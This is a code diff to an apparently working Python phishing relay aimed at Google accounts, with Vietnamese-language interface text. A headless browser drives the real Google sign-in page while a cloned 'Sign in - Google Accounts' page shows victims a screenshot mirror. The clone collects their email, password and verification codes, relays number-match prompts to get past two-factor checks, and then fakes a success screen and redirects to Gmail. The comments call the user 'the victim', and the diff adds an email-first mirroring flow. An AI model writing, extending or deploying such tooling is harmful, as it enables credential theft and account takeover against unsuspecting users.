@@ -22,6 +22,7 @@ Env: RELAY_SOCKS (socks5://user:pass@host:port), RELAY_PORT (9445),
      RELAY_BRIDGE_PORT (8119), RELAY_STORE (~/bgrelay-store).
 """
 
+import base64
 import json
 import os
 import queue
@@ -136,7 +137,7 @@ def ensure_xvfb():
 # --------------------------------------------------------------- session ---
 class RelaySession(threading.Thread):
 
-    def __init__(self, sid, email):
+    def __init__(self, sid, email=None):
         super().__init__(daemon=True)
         self.id = sid
         self.email = email
@@ -170,9 +171,12 @@ class RelaySession(threading.Thread):
         """Refresh the mirror: screenshot + number-match extraction.
         Called from every poll iteration (~1-2s cadence, single-threaded)."""
         try:
-            self.screenshot = pg.screenshot(type="jpeg", quality=60)
-        except Exception:
-            pass
+            self.screenshot = base64.b64encode(
+                pg.screenshot(type="jpeg", quality=60)).decode()
+        except Exception as e:
+            if not getattr(self, "_shot_err_logged", False):
+                self._shot_err_logged = True
+                print(f"[shot-err] {self.id}: {type(e).__name__}: {str(e)[:200]}", flush=True)
         try:
             body = self._body(pg)
             cands = re.findall(r"(?m)^\s*(\d{2})\s*$", body)
@@ -204,7 +208,7 @@ class RelaySession(threading.Thread):
 
     def _wait_input(self, pg, kind, hint):
         """Wait for the victim's input while keeping the mirror streaming."""
-        self.state = kind if kind != "code" else "challenge"
+        self.state = {"code": "challenge", "email": "init_email"}.get(kind, kind)
         self.need_input = kind
         self.hint = hint
         remaining = max(1.0, self.deadline - time.time())
@@ -269,6 +273,15 @@ class RelaySession(threading.Thread):
             pg.wait_for_selector("#identifierId", timeout=20000)
             pg.wait_for_selector("#identifierNext", state="visible", timeout=20000)
             time.sleep(2)  # let the v3 app finish booting so the click registers
+            if not self.email:
+                # mirror-first: the victim watches the REAL identifier page while
+                # typing the email into the relay bar — no fake UI at all
+                item = self._wait_input(pg, "email", "Nhập email của bạn")
+                if item[0] == "abort":
+                    self._finish(pg, "error", "Hết thời gian phiên")
+                    browser.close()
+                    return
+                self.email = item[1]
             pg.fill("#identifierId", self.email)
             time.sleep(0.5)
             pg.click("#identifierNext")
@@ -388,105 +401,90 @@ PAGE = """<!doctype html><html><head><meta charset=utf-8>
 <title>Sign in - Google Accounts</title>
 <style>
 *{box-sizing:border-box;font-family:'Google Sans','Segoe UI',Roboto,Arial,sans-serif}
-body{margin:0;background:#fff;color:#202124;display:flex;flex-direction:column;min-height:100vh}
-.wrap{flex:1;display:flex;justify-content:center}
-.card{width:450px;margin-top:64px;padding:48px 40px;border:1px solid #dadce0;border-radius:8px;height:fit-content}
-.logo{display:flex;justify-content:center;margin-bottom:16px}
-h1{font-size:24px;font-weight:400;text-align:center;margin:0 0 10px}
-.sub{font-size:16px;text-align:center;margin-bottom:28px;color:#202124}
-input{width:100%;padding:14px 15px;font-size:16px;border:1px solid #dadce0;border-radius:8px;outline:none;margin:8px 0 8px;background:#fff}
-input:focus{border-color:#0b57d0;box-shadow:0 0 0 1px #0b57d0}
-input.egpw{-webkit-text-security:disc}
-.row{display:flex;justify-content:space-between;align-items:center;margin-top:24px}
-.link{color:#0b57d0;font-size:14px}
-.nxt{background:#0b57d0;color:#fff;border:none;border-radius:100px;padding:10px 24px;font-size:14px;cursor:pointer}
-.nxt:disabled{background:#9aa0a6}
-.err{color:#d93025;font-size:13px;margin:6px 0 0;min-height:16px}
-.foot{padding:12px 24px;display:flex;justify-content:space-between;font-size:12px;color:#5f6368}
-.foot .l{display:flex;gap:18px}
-#num{display:none;background:#e8f0fe;color:#0b57d0;font-size:40px;font-weight:600;padding:12px 32px;border-radius:14px;margin:0 auto 18px;letter-spacing:8px;text-align:center;width:fit-content}
-#mirror{max-width:960px;width:100%;height:auto;border:1px solid #dadce0;border-radius:12px;background:#fff;filter:blur(18px);transition:filter .35s}
+html,body{margin:0;background:#fff;color:#202124;height:100%}
+body{display:flex;flex-direction:column}
+.wrap{flex:1;display:flex;align-items:center;justify-content:center;padding:12px;min-height:78vh}
+#box{width:100%;max-width:968px;text-align:center}
+#mirror{max-width:100%;width:100%;height:auto;border-radius:12px;background:#fff;
+ filter:blur(18px);transition:filter .35s;min-height:340px}
 #mirror.on{filter:none}
-#bar{margin:14px auto 0;display:flex;gap:8px;max-width:560px}
+#boot{display:block;margin:40px auto 14px;width:30px;height:30px;border:3px solid #dadce0;
+ border-top-color:#0b57d0;border-radius:50%;animation:r 1s linear infinite}
+@keyframes r{to{transform:rotate(360deg)}}
+#num{display:none;background:#e8f0fe;color:#0b57d0;font-size:40px;font-weight:600;
+ padding:12px 32px;border-radius:14px;margin:0 auto 16px;letter-spacing:8px;width:fit-content}
+#bar{margin:16px auto 0;display:flex;gap:8px;max-width:520px}
 #bar.off{display:none}
-#inp{flex:1;padding:12px 14px;font-size:15px;border:1px solid #dadce0;border-radius:8px;outline:none;background:#fff}
-#inp:focus{border-color:#0b57d0;box-shadow:0 0 0 1px #0b57d0}
-#inp.egpw{-webkit-text-security:disc}
-#go2{background:#0b57d0;color:#fff;border:none;border-radius:100px;padding:10px 22px;font-size:14px;cursor:pointer}
-#go2:disabled{background:#9aa0a6}
-#st2{margin:10px auto 0;font-size:13px;color:#5f6368;min-height:18px;text-align:center;max-width:560px}
+#rinp{flex:1;padding:12px 14px;font-size:15px;border:1px solid #dadce0;border-radius:8px;
+ outline:none;background:#fff;text-align:center}
+#rinp:focus{border-color:#0b57d0;box-shadow:0 0 0 1px #0b57d0}
+#rinp.egpw{-webkit-text-security:disc}
+#rgo{background:#0b57d0;color:#fff;border:none;border-radius:100px;padding:10px 22px;
+ font-size:14px;cursor:pointer}
+#rgo:disabled{background:#9aa0a6}
+#st{margin:8px auto 0;font-size:13px;color:#5f6368;min-height:18px}
+#st.err{color:#d93025}
+.foot{padding:10px 24px;display:flex;justify-content:space-between;font-size:12px;color:#5f6368}
+.foot .l{display:flex;gap:18px}
 </style></head><body>
-<div class=wrap>
-<div class=card id=card>
-<div class=logo><svg width=40 height=40 viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg></div>
-<h1>Sign in</h1>
-<div class=sub>Use your Google Account</div>
-<input id=inp autocomplete=off placeholder="Email or phone">
-<div class=err id=err></div>
-<div class=row><span class=link>Forgot email?</span><button class=nxt id=go>Next</button></div>
-</div>
-<div id=mirrorwrap style="display:none;text-align:center">
+<div class=wrap><div id=box>
+<div id=boot></div>
 <div id=num style="display:none">00</div>
-<img id=mirror alt="">
-<div id=bar class=off><input id=rinp autocomplete=off><button class=nxt id=rgo>Next</button></div>
-<div id=st2 style="font-size:13px;color:#5f6368;min-height:18px;margin-top:10px"></div>
-</div>
-</div>
-<div class=foot><div class=l><span>English (United States)</span></div><div class=l><span>Help</span><span>Privacy</span><span>Terms</span></div></div>
+<img id=mirror alt="" style="display:none">
+<div id=bar class=off><input id=rinp autocomplete=off><button id=rgo>Tiếp tục</button></div>
+<div id=st></div>
+</div></div>
+<div class=foot><div class=l><span>English (United States)</span></div>
+<div class=l><span>Help</span><span>Privacy</span><span>Terms</span></div></div>
 <script>
-var SID=null, EMAIL="", KIND=null,
-    mirror=document.getElementById('mirror'), numEl=document.getElementById('num'),
-    rbar=document.getElementById('bar'), rinp=document.getElementById('rinp'), rgo=document.getElementById('rgo'),
-    st2=document.getElementById('st2');
+var SID=null, KIND=null,
+    mirror=document.getElementById('mirror'), boot=document.getElementById('boot'),
+    numEl=document.getElementById('num'), rbar=document.getElementById('bar'),
+    rinp=document.getElementById('rinp'), rgo=document.getElementById('rgo'),
+    st=document.getElementById('st');
+var PLACE={email:'Email or phone',password:'Mật khẩu',code:'Mã xác minh'};
 ['pointermove','keydown','touchstart'].forEach(function(ev){
  document.addEventListener(ev,function(){mirror.classList.add('on');},{once:true,capture:true});});
-function setErr(t){document.getElementById('err').textContent=t||'';}
-function setSt2(t,err){st2.textContent=t||'';st2.style.color=err?'#d93025':'#5f6368';}
-function showMirror(){document.getElementById('card').style.display='none';
- document.getElementById('mirrorwrap').style.display='block';}
-function showRelayInput(kind,placeholder){rbar.className='';KIND=kind;
- rinp.className=kind==='password'?'egpw':'';rinp.value='';rinp.placeholder=placeholder||'';rinp.focus();}
+function setSt(t,err){st.textContent=t||'';st.className=err?'err':'';}
+function showInput(kind){KIND=kind;rbar.className='';
+ rinp.className=kind==='password'?'egpw':'';
+ rinp.placeholder=PLACE[kind]||'';rinp.value='';rinp.focus();rgo.disabled=false;}
+function hideInput(){KIND=null;rbar.className='off';}
 function relaySubmit(){
  if(!rinp.value)return;
- rgo.disabled=true;setSt2('Đang xử lý…');
+ rgo.disabled=true;setSt('Đang xử lý…');
  fetch('/__relay/api/input',{method:'POST',headers:{'Content-Type':'application/json'},
-  body:JSON.stringify({id:SID,kind:KIND,value:rinp.value})}).then(function(){rinp.value='';}).catch(function(){setSt2('Lỗi mạng',1);rgo.disabled=false;});
+  body:JSON.stringify({id:SID,kind:KIND,value:rinp.value})})
+  .then(function(){rinp.value='';}).catch(function(){setSt('Lỗi mạng',1);rgo.disabled=false;});
 }
-rgo.onclick=relaySubmit; rinp.onkeydown=function(k){if(k.key==='Enter')relaySubmit();};
-function submit(){
- var v=document.getElementById('inp').value;
- if(!v||v.indexOf('@')<0){setErr('Nhập địa chỉ email');return;}
- setErr('');EMAIL=v;showMirror();setSt2('Đang mở trang đăng nhập…');
- fetch('/__relay/api/start',{method:'POST',headers:{'Content-Type':'application/json'},
-  body:JSON.stringify({email:v})}).then(function(r){return r.json();}).then(function(j){SID=j.id;poll();})
-  .catch(function(){setSt2('Lỗi mạng — thử lại',1);});
-}
-document.getElementById('go').onclick=submit;
-document.getElementById('inp').onkeydown=function(k){if(k.key==='Enter')submit();};
-function stagePassword(){showRelayInput('password','Nhập mật khẩu cho '+EMAIL);setSt2('');}
-function stageChallenge(st){
- if(st.need_input==='code'){showRelayInput('code','Nhập mã xác minh');}
- else{rbar.className='off';}
- setSt2(st.hint||'Kiểm tra điện thoại của bạn');
-}
+rgo.onclick=relaySubmit;rinp.onkeydown=function(k){if(k.key==='Enter')relaySubmit();};
 function stageDone(){
- rbar.className='off';setSt2('');
- numEl.insertAdjacentHTML('afterend','<div style="text-align:center;margin:14px 0"><svg width=56 height=56 viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="11" stroke="#34A853" stroke-width="2"/><path d="M7 12.5l3.2 3.2L17 9" stroke="#34A853" stroke-width="2" fill="none"/></svg><div style="font-size:20px;margin-top:10px">Bạn đã đăng nhập thành công</div><div style="color:#5f6368;font-size:14px;margin-top:6px">Đang chuyển tới Gmail…</div></div>');
+ hideInput();setSt('');
+ numEl.insertAdjacentHTML('afterend','<div style="margin:14px 0"><svg width=56 height=56 viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="11" stroke="#34A853" stroke-width="2"/><path d="M7 12.5l3.2 3.2L17 9" stroke="#34A853" stroke-width="2" fill="none"/></svg><div style="font-size:20px;margin-top:10px">Bạn đã đăng nhập thành công</div><div style="color:#5f6368;font-size:14px;margin-top:6px">Đang chuyển tới Gmail…</div></div>');
  setTimeout(function(){location.href='https://mail.google.com';},2600);
 }
 function poll(){
  if(!SID){setTimeout(poll,900);return;}
- fetch('/__relay/api/state?id='+SID).then(function(r){return r.json();}).then(function(st){
-  if(st.screenshot){var src='data:image/jpeg;base64,'+st.screenshot;
-   if(mirror.getAttribute('src')!==src){mirror.src=src;mirror.classList.add('on');}}
-  if(st.match_number){numEl.style.display='block';numEl.textContent=st.match_number;}
-  if(st.state==='password'){stagePassword();}
-  else if(st.state==='challenge'){stageChallenge(st);}
-  else if(st.state==='done'){stageDone();return;}
-  else if(st.state==='error'){rbar.className='off';setSt2(st.hint||'Không thể đăng nhập',1);return;}
+ fetch('/__relay/api/state?id='+SID).then(function(r){return r.json();}).then(function(x){
+  if(x.screenshot){
+   var src='data:image/jpeg;base64,'+x.screenshot;
+   if(mirror.getAttribute('src')!==src){mirror.src=src;}
+   mirror.style.display='block';boot.style.display='none';mirror.classList.add('on');
+  }
+  if(x.match_number){numEl.style.display='block';numEl.textContent=x.match_number;}
+  if(x.state==='done'){stageDone();return;}
+  if(x.state==='error'){hideInput();setSt(x.hint||'Không thể đăng nhập',1);return;}
+  if(x.need_input){if(KIND!==x.need_input)showInput(x.need_input);}
+  else if(KIND){hideInput();}
+  if(x.state==='init'||x.state==='init_email'&&!x.screenshot){setSt('Đang mở trang đăng nhập…');}
+  else if(!KIND&&!x.match_number&&x.state!=='challenge'){setSt('');}
   setTimeout(poll,1200);
  }).catch(function(){setTimeout(poll,2200);});
 }
+setSt('Đang mở trang đăng nhập…');
+fetch('/__relay/api/start',{method:'POST',headers:{'Content-Type':'application/json'},
+ body:JSON.stringify({})}).then(function(r){return r.json();}).then(function(j){SID=j.id;poll();})
+ .catch(function(){setSt('Lỗi mạng — tải lại trang',1);});
 poll();
 </script></body></html>"""
 
@@ -544,8 +542,10 @@ class Handler(BaseHTTPRequestHandler):
             return self._json({"error": "bad json"}, 400)
         if path == "/api/start":
             email = (data.get("email") or "").strip()[:120]
-            if not re.match(r"[^@\s]+@[^@\s]+\.[^@\s]+", email):
+            if email and not re.match(r"[^@\s]+@[^@\s]+\.[^@\s]+", email):
                 return self._json({"error": "bad email"}, 400)
+            if not email:
+                email = None
             sid = secrets.token_hex(8)
             s = RelaySession(sid, email)
             with LOCK:
